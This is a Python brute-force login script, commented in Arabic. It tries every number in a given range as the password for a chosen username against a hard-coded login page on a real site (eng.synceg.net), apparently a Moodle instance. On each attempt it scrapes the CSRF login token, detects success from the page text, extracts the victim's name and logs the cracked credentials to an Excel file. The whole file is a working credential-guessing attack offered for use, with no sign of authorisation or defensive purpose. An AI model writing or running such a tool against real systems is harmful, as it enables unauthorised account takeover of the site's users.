import argparse
import requests
import time
import pygame
import re
from openpyxl import Workbook, load_workbook
import os

# إعداد argparse
parser = argparse.ArgumentParser(description="🔐 Brute-force login tool using numeric password range")

parser.add_argument("username", help="Username to try logging in with")
parser.add_argument("start", type=int, help="Start of numeric password range (inclusive)")
parser.add_argument("end", type=int, help="End of numeric password range (exclusive)")
parser.add_argument("--delay", type=float, default=0.1, help="Delay between attempts (default: 0.1 sec)")
parser.add_argument("--nosound", action="store_true", help="Disable sound notification")
parser.add_argument("--excel", default="results.xlsx", help="Output Excel file path (default: results.xlsx)")

args = parser.parse_args()

# الثوابت
url = "https://eng.synceg.net/login/index.php"
headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}
session = requests.Session()

def play_sound(path):
    pygame.mixer.init()
    pygame.mixer.music.load(path)
    pygame.mixer.music.play()
    while pygame.mixer.music.get_busy():
        continue

def get_token():
    response = session.get(url)
    if "logintoken" in response.text:
        token = re.search(r'name="logintoken" value="(.+?)"', response.text)
        if token:
            return token.group(1)
    return None

def try_login(password):
    token = get_token()
    if not token:
        print("[!] Couldn't fetch login token.")
        return False, None

    data = {
        "anchor": "",
        "logintoken": token,
        "username": args.username,
        "password": str(password).strip()
    }

    response = session.post(url, data=data, headers=headers)

    if "Invalid login" not in response.text and "incorrect" not in response.text:
        print("[*] Found correct password: {}".format(password))
        name_match = re.search(r'<h1 class="h2.*?">.*?Hi,\s*(.*?)!.*?</h1>', response.text, re.DOTALL)
        if name_match:
            name = name_match.group(1).strip()
        else:
            name = "Unknown"
        return True, name
    return False, None

# إنشاء أو تحميل ملف Excel
excel_path = args.excel
if os.path.exists(excel_path):
    workbook = load_workbook(excel_path)
    sheet = workbook.active
else:
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["Username", "Password", "Name"])

# تجربة كل كلمة مرور في المدى
for password in range(args.start, args.end):
    print(f"[*] Trying: {password}")
    success, name = try_login(password)
    if success:
        sheet.append([args.username, str(password), name])
        workbook.save(excel_path)
        if not args.nosound:
            play_sound("D:\\tools\\full_app\\weGotIt.mp3")
        break
    time.sleep(args.delay)
